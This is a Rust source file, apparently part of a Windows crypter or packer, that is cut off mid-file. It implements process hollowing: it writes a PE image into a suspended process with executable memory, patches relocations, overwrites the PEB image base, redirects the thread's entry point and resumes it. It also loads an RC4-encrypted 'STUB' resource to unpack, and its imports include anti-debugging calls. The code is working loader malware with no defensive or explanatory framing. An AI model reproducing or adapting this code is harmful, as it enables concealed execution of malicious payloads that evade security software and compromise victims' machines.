use std::env;
use std::ffi::CString;
use std::fs::{self, File};
use std::io::{self, Read};
use std::process;
use std::mem;
use std::ptr;
use winapi::shared::minwindef::HGLOBAL;
use winapi::um::libloaderapi::{GetModuleHandleA, FindResourceW, LoadResource, LockResource, SizeofResource};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE};
use windows::Win32::System::Threading::{
    CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA,
    CREATE_SUSPENDED,
};
use winapi::um::winnt::PAGE_READWRITE;
use winapi::um::processthreadsapi::GetExitCodeProcess;
use winapi::um::minwinbase::STILL_ACTIVE;
use winapi::shared::minwindef::{BOOL, DWORD, FARPROC, HMODULE, LPVOID, PBYTE, PULONG, ULONG};
use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER, NTSTATUS, PVOID};
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::memoryapi::{ReadProcessMemory, VirtualAlloc, VirtualFree, VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{
    HANDLE as WINNT_HANDLE, MEM_RELEASE, PAGE_EXECUTE_READWRITE,
};
use winapi::shared::basetsd::SIZE_T;
use winapi::um::winnt::WOW64_FLOATING_SAVE_AREA;
use winapi::um::winnt::PAGE_EXECUTE_READ;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualQueryEx;
use winapi::um::winnt::{MEMORY_BASIC_INFORMATION};
use winapi::um::processthreadsapi::{GetThreadContext, SetThreadContext, ResumeThread,TerminateProcess};
use winapi::um::winnt::CONTEXT;
use winapi::um::winnt::CONTEXT_INTEGER;
use winapi::um::winnt::BOOLEAN;
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::CONTEXT_FULL;
use winapi::um::winbase::Wow64GetThreadContext;
use winapi::um::winnt::WOW64_CONTEXT;
use winapi::um::winbase::Wow64SetThreadContext;
use winapi::um::memoryapi::VirtualProtectEx;
use winapi::um::winnt::CONTEXT_SEGMENTS;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
use winapi::um::errhandlingapi::RemoveVectoredExceptionHandler;
use winapi::shared::ntdef::LONG;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::winnt::PAGE_GUARD;
use winapi::um::winnt::PEXCEPTION_POINTERS;
use winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
use winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
use std::{
    arch::asm, ffi::c_void, mem::transmute, panic, ptr::{null, null_mut}
};
use std::process::exit;
use windows::Win32::System::
    SystemInformation::{
        GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO
};
use windows::
    Win32::System::{
        Diagnostics::Debug::{IsDebuggerPresent, CONTEXT_DEBUG_REGISTERS_AMD64},
        Memory::PAGE_PROTECTION_FLAGS,
        Threading::{
            CreateRemoteThread, OpenProcess, INFINITE, PROCESS_ALL_ACCESS,GetCurrentThread, TEB
        },
        Kernel::NT_TIB,
};
use windows::core::s;
use sysinfo::System;
use winapi::um::winnt::LPCSTR;

use crate::structures::*;
use crate::utils::{Rc4, wide_string, count_relocation_entries};

// External function declarations
extern "system" {
    fn NtQueryInformationThread(
        ThreadHandle: HANDLE,
        ThreadInformationClass: u32,
        ThreadInformation: PVOID,
        ThreadInformationLength: u32,
        ReturnLength: *mut u32
    ) -> i32;
}

// Macro definitions
#[macro_export]
macro_rules! MAKEINTRESOURCE {
    ($i:expr) => { $i as u16 as usize as *mut u16 }
}

// Basic PE utility functions
pub fn get_pe_magic(buffer: *const u8) -> io::Result<u16> {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders64;
        println!("dos_header: {:p}", dos_header);
        println!("nt_headers: {:p}", nt_headers);
        println!("buffer: {:p}", buffer);
        Ok((*nt_headers).optional_header.magic)
    }
}

pub fn read_remote_pe_magic(process_handle: HANDLE, base_address: PVOID) -> io::Result<u16> {
    let mut buffer = vec![0u8; BUFFER_SIZE];
    
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            base_address,
            buffer.as_mut_ptr() as PVOID,
            BUFFER_SIZE,
            ptr::null_mut(),
        )
    };

    if success == 0 {
        return Err(io::Error::last_os_error());
    }

    get_pe_magic(buffer.as_ptr())
}

pub fn has_relocation64(buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders64;
        println!("Relocation table address: 0x{:X}", (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address);
        (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address != 0
    }
}

pub fn has_relocation32(buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders32;
        (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address != 0
    }
}

pub fn get_reloc_address64(buffer: *const u8) -> ImageDataDirectory {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *const ImageNtHeaders64;
        
        if (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address != 0 {
            return (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        }
        
        ImageDataDirectory {
            virtual_address: 0,
            size: 0,
        }
    }
} 

// PEB and process information functions
pub fn initialize_nt_query_information_process() -> Option<NtQueryInformationProcess> {
    unsafe {
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            return None;
        }

        let proc_addr = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr() as *const i8);
        if proc_addr.is_null() {
            return None;
        }

        Some(std::mem::transmute(proc_addr))
    }
}

pub fn find_remote_peb(process_handle: HANDLE) -> PVOID {
    let nt_query = match initialize_nt_query_information_process() {
        Some(func) => func,
        None => return ptr::null_mut(),
    };

    let mut basic_info = ProcessBasicInformation {
        reserved1: ptr::null_mut(),
        peb_base_address: ptr::null_mut(),
        reserved2: [ptr::null_mut(); 2],
        unique_process_id: 0,
        reserved3: ptr::null_mut(),
    };
    let mut return_length = 0;

    unsafe {
        let status = nt_query(
            process_handle,
            0,
            &mut basic_info as *mut _ as PVOID,
            mem::size_of::<ProcessBasicInformation>() as ULONG,
            &mut return_length,
        );

        if status >= 0 {
            basic_info.peb_base_address
        } else {
            ptr::null_mut()
        }
    }
}

pub fn read_remote_peb(process_handle: HANDLE) -> Option<Box<PEB>> {
    let peb_address = find_remote_peb(process_handle);
    if peb_address.is_null() {
        return None;
    }

    let mut peb = Box::new(unsafe { mem::zeroed::<PEB>() });
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            peb_address,
            &mut *peb as *mut PEB as PVOID,
            mem::size_of::<PEB>(),
            ptr::null_mut(),
        )
    };

    if success == 0 {
        None
    } else {
        Some(peb)
    }
}

pub fn read_remote_image(process_handle: HANDLE, image_base_address: PVOID) -> Option<Box<LoadedImage>> {
    let mut buffer = vec![0u8; BUFFER_SIZE];
    
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            image_base_address,
            buffer.as_mut_ptr() as PVOID,
            BUFFER_SIZE,
            ptr::null_mut(),
        )
    };

    if success == 0 {
        return None;
    }

    unsafe {
        let dos_header = buffer.as_ptr() as *const ImageDosHeader;
        let nt_headers = (buffer.as_ptr() as usize + (*dos_header).e_lfanew as usize) 
            as *mut ImageNtHeaders64;
        
        let image = Box::new(LoadedImage {
            file_header: nt_headers,
            number_of_sections: (*nt_headers).file_header.number_of_sections,
            sections: (buffer.as_ptr() as usize + (*dos_header).e_lfanew as usize + 
                mem::size_of::<ImageNtHeaders64>()) as *mut ImageSectionHeader,
        });

        Some(image)
    }
}

pub fn read_remote_image32(process_handle: HANDLE, image_base_address: PVOID) -> Option<Box<LoadedImage>> {
    // Read DOS header first
    let mut dos_header: ImageDosHeader = unsafe { mem::zeroed() };
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            image_base_address,
            &mut dos_header as *mut _ as PVOID,
            mem::size_of::<ImageDosHeader>(),
            ptr::null_mut(),
        )
    };

    if success == 0 {
        return None;
    }

    // Read NT Headers
    let mut nt_headers32: ImageNtHeaders32 = unsafe { mem::zeroed() };
    let success = unsafe {
        ReadProcessMemory(
            process_handle,
            (image_base_address as usize + dos_header.e_lfanew as usize) as PVOID,
            &mut nt_headers32 as *mut _ as PVOID,
            mem::size_of::<ImageNtHeaders32>(),
            ptr::null_mut(),
        )
    };

    if success == 0 {
        return None;
    }

    Some(Box::new(LoadedImage {
        file_header: &nt_headers32 as *const _ as *mut ImageNtHeaders64,
        number_of_sections: nt_headers32.file_header.number_of_sections,
        sections: ((image_base_address as usize + dos_header.e_lfanew as usize + 
            mem::size_of::<ImageNtHeaders32>()) as *mut ImageSectionHeader),
    }))
}

pub fn get_process_address_information32(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION) 
    -> Option<ProcessAddressInformation> {
    unsafe {
        let mut ctx: WOW64_CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL;
        
        if Wow64GetThreadContext(process_info.hThread, &mut ctx) == 0 {
            return None;
        }

        let mut image_base: PVOID = ptr::null_mut();
        if ReadProcessMemory(
            process_info.hProcess,
            (ctx.Ebx + 0x8) as PVOID,
            &mut image_base as *mut PVOID as PVOID,
            std::mem::size_of::<DWORD>(),
            ptr::null_mut()
        ) == 0 {
            return None;
        }

        Some(ProcessAddressInformation {
            peb_address: ctx.Ebx as PVOID,
            image_base_address: image_base,
        })
    }
}

pub fn get_nt_headers(image_base: PVOID) -> *mut ImageNtHeaders64 {
    unsafe {
        let dos_header = image_base as *const ImageDosHeader;
        (image_base as usize + (*dos_header).e_lfanew as usize) as *mut ImageNtHeaders64
    }
}

pub fn get_loaded_image(image_base: PVOID) -> Box<LoadedImage> {
    unsafe {
        let dos_header = image_base as *const ImageDosHeader;
        let nt_headers = get_nt_headers(image_base);
        
        Box::new(LoadedImage {
            file_header: nt_headers,
            number_of_sections: (*nt_headers).file_header.number_of_sections,
            sections: (image_base as usize + (*dos_header).e_lfanew as usize + 
                mem::size_of::<ImageNtHeaders64>()) as *mut ImageSectionHeader,
        })
    }
}

pub fn get_nt_unmap_view_of_section() -> Option<NtUnmapViewOfSection> {
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            println!("Failed to get ntdll handle");
            return None;
        }

        let proc_addr = GetProcAddress(ntdll, b"NtUnmapViewOfSection\0".as_ptr() as *const i8);
        if proc_addr.is_null() {
            println!("Failed to get NtUnmapViewOfSection address");
            return None;
        }

        Some(std::mem::transmute(proc_addr))
    }
} 

// Main PE execution functions
pub fn run_pe64(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION, 
    buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *const ImageNtHeaders64;

        // Allocate memory in target process
        let alloc_address = VirtualAllocEx(
            process_info.hProcess,
            (*nt_headers).optional_header.image_base as PVOID,
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if alloc_address.is_null() {
            println!("[-] An error occurred when trying to allocate memory for the new image.");
            unsafe { VirtualFree(buffer as *mut winapi::ctypes::c_void, 0, MEM_RELEASE); }
            return false;
        }
        println!("[+] Memory allocated at: {:p}", alloc_address);

        // Write PE headers
        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_headers as usize,
            ptr::null_mut()
        );

        if write_headers == 0 {
            println!("[-] An error occurred when trying to write the headers of the new image.");
            unsafe {
                TerminateProcess(process_info.hProcess, 1);
                VirtualFree(buffer as *mut winapi::ctypes::c_void, 0, MEM_RELEASE);
            }
            return false;
        }
        println!("[+] Headers written at: {:p}", (*nt_headers).optional_header.image_base as *const u8);

        // Write sections
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize + 
            std::mem::size_of::<u32>() +  // Skip NT signature
            std::mem::size_of::<ImageFileHeader>() + 
            (*nt_headers).file_header.size_of_optional_header as usize + 
            (i as usize * std::mem::size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                ptr::null_mut()
            );

            if write_section == 0 {
                println!("[-] An error occurred when trying to write section: {}",
                    String::from_utf8_lossy(&(*section_header).name));
                return false;
            }
            println!("[+] Section {} written at: {:p}",
                String::from_utf8_lossy(&(*section_header).name),
                (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);
        }

        // Get and modify thread context
        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL;

        if GetThreadContext(process_info.hThread, &mut context) == 0 {
            println!("[-] An error occurred when trying to get the thread context.");
            return false;
        }

        // Write image base to PEB
        let image_base = (*nt_headers).optional_header.image_base;
        if WriteProcessMemory(
            process_info.hProcess,
            (context.Rdx + 0x10) as PVOID,
            &image_base as *const u64 as PVOID,
            std::mem::size_of::<u64>(),
            ptr::null_mut()
        ) == 0 {
            println!("[-] An error occurred when trying to write the image base in the PEB.");
            return false;
        }

        // Set new entry point
        context.Rcx = alloc_address as u64 + (*nt_headers).optional_header.address_of_entry_point as u64;

        if SetThreadContext(process_info.hThread, &context) == 0 {
            println!("[-] An error occurred when trying to set the thread context.");
            return false;
        }

        ResumeThread(process_info.hThread);
        true
    }
}

pub fn run_pe32(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION, 
    buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *const ImageNtHeaders32;

        // Allocate memory in target process
        let alloc_address = VirtualAllocEx(
            process_info.hProcess,
            (*nt_headers).optional_header.image_base as PVOID,
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if alloc_address.is_null() {
            println!("[-] An error occurred when trying to allocate memory for the new image.");
            return false;
        }
        println!("[+] Memory allocated at: {:p}", alloc_address);

        // Write PE headers
        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_headers as usize,
            ptr::null_mut()
        );

        if write_headers == 0 {
            println!("[-] An error occurred when trying to write the headers of the new image.");
            return false;
        }
        println!("[+] Headers written at: {:p}", (*nt_headers).optional_header.image_base as *const u8);

        // Write sections
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize + 
                std::mem::size_of::<u32>() +  // Skip NT signature
                std::mem::size_of::<ImageFileHeader>() + 
                (*nt_headers).file_header.size_of_optional_header as usize + 
                (i as usize * std::mem::size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                ptr::null_mut()
            );

            if write_section == 0 {
                println!("[-] An error occurred when trying to write section: {}",
                    String::from_utf8_lossy(&(*section_header).name));
                return false;
            }
            println!("[+] Section {} written at: {:p}",
                String::from_utf8_lossy(&(*section_header).name),
                (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);
        }

        // Get and modify thread context
        let mut context: WOW64_CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL;

        if Wow64GetThreadContext(process_info.hThread, &mut context) == 0 {
            println!("[-] An error occurred when trying to get the thread context.");
            return false;
        }

        // Write image base to PEB
        let image_base = (*nt_headers).optional_header.image_base;
        if WriteProcessMemory(
            process_info.hProcess,
            (context.Ebx + 0x8) as PVOID,
            &image_base as *const u32 as PVOID,
            std::mem::size_of::<u32>(),
            ptr::null_mut()
        ) == 0 {
            println!("[-] An error occurred when trying to write the image base in the PEB.");
            return false;
        }

        // Set new entry point
        context.Eax = alloc_address as u32 + (*nt_headers).optional_header.address_of_entry_point;

        if winapi::um::winbase::Wow64SetThreadContext(process_info.hThread, &context) == 0 {
            println!("[-] An error occurred when trying to set the thread context.");
            return false;
        }

        ResumeThread(process_info.hThread);
        true
    }
} 

// Relocation functions
pub fn run_pe_reloc64(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION, 
    buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *mut ImageNtHeaders64;

        let alloc_address = VirtualAllocEx(
            process_info.hProcess,
            ptr::null_mut(),
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if alloc_address.is_null() {
            println!("[-] An error occurred when trying to allocate memory for the new image.");
            return false;
        }
        println!("[+] Memory allocated at: {:p}", alloc_address);

        let delta = alloc_address as u64 - (*nt_headers).optional_header.image_base;
        (*nt_headers).optional_header.image_base = alloc_address as u64;

        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_headers as usize,
            ptr::null_mut()
        );

        if write_headers == 0 {
            println!("[-] An error occurred when trying to write the headers of the new image.");
            return false;
        }
        println!("[+] Headers written at: {:p}", alloc_address);

        // Get relocation directory info
        let image_data_reloc = get_reloc_address64(buffer);
        let mut reloc_section = ptr::null_mut();

        // Write sections and find relocation section
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize + 
                std::mem::size_of::<u32>() +  // Skip NT signature
                std::mem::size_of::<ImageFileHeader>() + 
                (*nt_headers).file_header.size_of_optional_header as usize + 
                (i as usize * std::mem::size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            // Check if this is the relocation section
            if image_data_reloc.virtual_address >= (*section_header).virtual_address &&
               image_data_reloc.virtual_address < ((*section_header).virtual_address + (*section_header).virtual_size) {
                reloc_section = section_header as *mut ImageSectionHeader;
            }

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                ptr::null_mut()
            );

            if write_section == 0 {
                println!("[-] An error occurred when trying to write section: {}",
                    String::from_utf8_lossy(&(*section_header).name));
                return false;
            }
            println!("[+] Section {} written at: {:p}",
                String::from_utf8_lossy(&(*section_header).name),
                (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);
        }

        if reloc_section.is_null() {
            println!("[-] Failed to find relocation section.");
            return false;
        }

        println!("[+] Relocation section found: {}", 
            String::from_utf8_lossy(&(*reloc_section).name));

        // Process relocations
        let mut reloc_offset = 0u32;
        while reloc_offset < image_data_reloc.size {
            let base_relocation = (buffer as usize + 
                (*reloc_section).pointer_to_raw_data as usize + 
                reloc_offset as usize) as *const BaseRelocationBlock;
            
            reloc_offset += std::mem::size_of::<BaseRelocationBlock>() as u32;
            
            let entries = count_relocation_entries((*base_relocation).block_size);
            if (*base_relocation).block_size < mem::size_of::<BaseRelocationBlock>() as u32 {
                return false;
            }
            for _ in 0..entries {
                let entry = (buffer as usize + 
                    (*reloc_section).pointer_to_raw_data as usize + 
                    reloc_offset as usize) as *const BaseRelocationEntry;
                
                reloc_offset += std::mem::size_of::<BaseRelocationEntry>() as u32;
                
                if (*entry).type_() == 0 {
                    continue;
                }
            
                let address_location = alloc_address as u64 + 
                    (*base_relocation).page_address as u64 + 
                    (*entry).offset() as u64;

                let mut patched_address: u64 = 0;
                ReadProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &mut patched_address as *mut u64 as PVOID,
                    std::mem::size_of::<u64>(),
                    ptr::null_mut()
                );
            
                patched_address += delta;
            
                let mut write_result = 0;
                WriteProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &patched_address as *const u64 as PVOID, 
                    std::mem::size_of::<u64>(),
                    &mut write_result
                );

                if write_result == 0 {
                    return false;
                }
            }
        println!("[+] Relocation block processed at 0x{:X}", (*base_relocation).page_address);
    }
        println!("[+] Relocations processed successfully.");

        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL;

        if GetThreadContext(process_info.hThread, &mut context) == 0 {
            println!("[-] An error occurred when trying to get the thread context.");
            return false;
        }

        // Update PEB with new image base
        if WriteProcessMemory(
            process_info.hProcess,
            (context.Rdx + 0x10) as PVOID,
            &alloc_address as *const PVOID as PVOID,
            std::mem::size_of::<u64>(),
            ptr::null_mut()
        ) == 0 {
            println!("[-] An error occurred when trying to write the image base in the PEB.");
            return false;
        }

        // Set new entry point
        context.Rcx = alloc_address as u64 + (*nt_headers).optional_header.address_of_entry_point as u64;

        if SetThreadContext(process_info.hThread, &context) == 0 {
            println!("[-] An error occurred when trying to set the thread context.");
            return false;
        }

        ResumeThread(process_info.hThread);
        true
    }
}

pub fn run_pereloc32(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION,
    buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *mut ImageNtHeaders32;
            

        // Allocate memory in target process
        let alloc_address = VirtualAllocEx(
            process_info.hProcess,
            ptr::null_mut(),
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if alloc_address.is_null() {
            println!("[-] An error occurred when trying to allocate memory for the new image.");
            return false;
        }
        println!("[+] Memory allocated at: {:p}", alloc_address);

        let delta_image_base = alloc_address as u32 - (*nt_headers).optional_header.image_base;
        println!("[+] Delta: 0x{:X}", delta_image_base);

        (*nt_headers).optional_header.image_base = alloc_address as u32;

        // Write PE headers
        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_headers as usize,
            ptr::null_mut()
        );

        if write_headers == 0 {
            println!("[-] An error occurred when trying to write the headers of the new image.");
            return false;
        }
        println!("[+] Headers written at: {:p}", alloc_address);

        // Get relocation directory info and find relocation section
        let image_data_reloc = (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        let mut reloc_section = ptr::null_mut();

        // Write sections and identify relocation section
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize + 
                std::mem::size_of::<u32>() +  // Skip NT signature
                std::mem::size_of::<ImageFileHeader>() + 
                (*nt_headers).file_header.size_of_optional_header as usize + 
                (i as usize * std::mem::size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            // Check if this is the relocation section
            if image_data_reloc.virtual_address >= (*section_header).virtual_address &&
               image_data_reloc.virtual_address < ((*section_header).virtual_address + (*section_header).virtual_size) {
                reloc_section = section_header as *mut ImageSectionHeader;
            }

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                ptr::null_mut()
            );

            if write_section == 0 {
                println!("[-] An error occurred when trying to write section: {}",
                    String::from_utf8_lossy(&(*section_header).name));
                return false;
            }
            println!("[+] Section {} written at: {:p}",
                String::from_utf8_lossy(&(*section_header).name),
                (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);
        }

        if reloc_section.is_null() {
            println!("[-] Failed to find relocation section.");
            return false;
        }

        println!("[+] Relocation section found: {}", 
            String::from_utf8_lossy(&(*reloc_section).name));

        // Process relocations
        let mut reloc_offset = 0u32;
        while reloc_offset < image_data_reloc.size {
            let base_relocation = (buffer as usize + 
                (*reloc_section).pointer_to_raw_data as usize + 
                reloc_offset as usize) as *const BaseRelocationBlock;
            
            reloc_offset += std::mem::size_of::<BaseRelocationBlock>() as u32;
            
            let entries = count_relocation_entries((*base_relocation).block_size);
            
            for _ in 0..entries {
                let entry = (buffer as usize + 
                    (*reloc_section).pointer_to_raw_data as usize + 
                    reloc_offset as usize) as *const BaseRelocationEntry;
                    
                reloc_offset += std::mem::size_of::<BaseRelocationEntry>() as u32;
                
                if (*entry).type_() == 0 {
                    continue;
                }
        
                // Calculate the actual address to patch relative to our new base
                let address_location = alloc_address as u32 + 
                    (*base_relocation).page_address + 
                    (*entry).offset() as u32;
                    
                // Read current value
                let mut original_value: u32 = 0;
                ReadProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &mut original_value as *mut u32 as PVOID,
                    std::mem::size_of::<u32>(),
                    ptr::null_mut()
                );
                
                // Calculate new value based on relocation delta
                let patched_value = original_value + delta_image_base;
                
                // Write patched value
                WriteProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &patched_value as *const u32 as PVOID,
                    std::mem::size_of::<u32>(),
                    ptr::null_mut()
                );
                
                // Verify write
                let mut verify_value: u32 = 0;
                ReadProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &mut verify_value as *mut u32 as PVOID,
                    std::mem::size_of::<u32>(),
                    ptr::null_mut()
                );
                
                if verify_value != patched_value {
                    return false;  // Stop if verification fails
                }
            }
        }

        println!("[+] Relocations processed successfully.");

        let mut ctx: WOW64_CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL;
        println!("[*] Getting WOW64 Thread Context");
        let success = Wow64GetThreadContext(process_info.hThread, &mut ctx);
        if success == 0 {
            println!("[-] Failed to get Thread Context. Error: {:#x}", GetLastError());
            return false;
        }
        println!("[+] Successfully got Thread Context");

        let peb_image_base_offset = 0x8; // Offset to ImageBaseAddress in PEB
        let peb_write_addr = (ctx.Ebx as usize + peb_image_base_offset) as PVOID;
        let alloc_addr_u32 = alloc_address as u32;

        let result = WriteProcessMemory(
            process_info.hProcess,
            peb_write_addr,
            &alloc_addr_u32 as *const u32 as PVOID,
            std::mem::size_of::<u32>(),
            ptr::null_mut()
        );

        if result == 0 {
            println!("[-] Failed to write PEB. Error: {:#x}", GetLastError());
            return false;
        }
        println!("[+] Successfully wrote new image base to PEB");

        ctx.Eax = alloc_address as u32 + (*nt_headers).optional_header.address_of_entry_point;
        println!("[*] Original entry point: {:#x}", (*nt_headers).optional_header.address_of_entry_point);
        println!("[*] Setting EAX to new entry point: {:#x}", ctx.Eax);

        let set_context = Wow64SetThreadContext(process_info.hThread, &ctx);
        if set_context == 0 {
            println!("[-] Failed to set Thread Context. Error: {:#x}", GetLastError());
            return false;
        }
        println!("[+] Thread context set successfully");
        
        let mut old_protect: DWORD = 0;
        VirtualProtectEx(
            process_info.hProcess,
            alloc_address as PVOID,
            (*nt_headers).optional_header.size_of_image as SIZE_T,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect
        );
        ResumeThread(process_info.hThread);
        println!("[+] Thread resumed");
        
        // Wait for process initialization (5 second timeout)
        let wait_result = WaitForSingleObject(process_info.hProcess, 5000);
        match wait_result {
            WAIT_OBJECT_0 => {
                let mut exit_code: DWORD = 0;
                if GetExitCodeProcess(process_info.hProcess, &mut exit_code) != 0 {
                    // Process terminated
                }
                return false;
            }
            WAIT_TIMEOUT => {
                // Process is still running
                let mut exit_code: DWORD = 0;
                if GetExitCodeProcess(process_info.hProcess, &mut exit_code) != 0 {
                    // Process status check
                }
            }
            _ => {
                return false;
            }
        }
        true   
    }
}

// Main unpack function
pub unsafe fn fn_unpack() -> io::Result<()> {
    // Get handle to current module
    let h_file = GetModuleHandleA(ptr::null());
    if h_file.is_null() {
        println!("GetModuleHandleA fails");
        return Ok(());
    }

    // Find the resource with ID
    let h_resource = FindResourceW(
        h_file,
        69 as *const u16,  // Resource ID
        wide_string("STUB").as_ptr()
    );
    
    if h_resource.is_null() {
        println!("FindResourceW fails. 0x{:x}", GetLastError());
        return Ok(());
    }
    println!("Found it");

    // Get size of the resource
    let dw_size_of_resource = SizeofResource(h_file, h_resource);
    if dw_size_of_resource == 0 {
        println!("SizeofResource fails");
        return Ok(());
    }

    // Load the resource
    let hg_resource: HGLOBAL = LoadResource(h_file, h_resource);
    if hg_resource.is_null() {
        println!("LoadResource fails");
        return Ok(());
    }

    // Lock the resource
    let lp_resource = LockResource(hg_resource);
    if lp_resource.is_null() {
        println!("LockResource fails");
        return Ok(());
    }

    // Allocate memory for the resource
    let mut buffer = VirtualAlloc(
        ptr::null_mut(),
        dw_size_of_resource as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if buffer.is_null() {
        println!("VirtualAlloc fails");
        return Ok(());
    }

    // Create a mutable buffer to hold the resource data
    let mut lpbuffer = Vec::with_capacity(dw_size_of_resource as usize);
    ptr::copy_nonoverlapping(
        lp_resource as *const u8,
        lpbuffer.as_mut_ptr(),
        dw_size_of_resource as usize
    );
    lpbuffer.set_len(dw_size_of_resource as usize);

    // Initialize decryption key
    let mut key: [u8; 30] = [
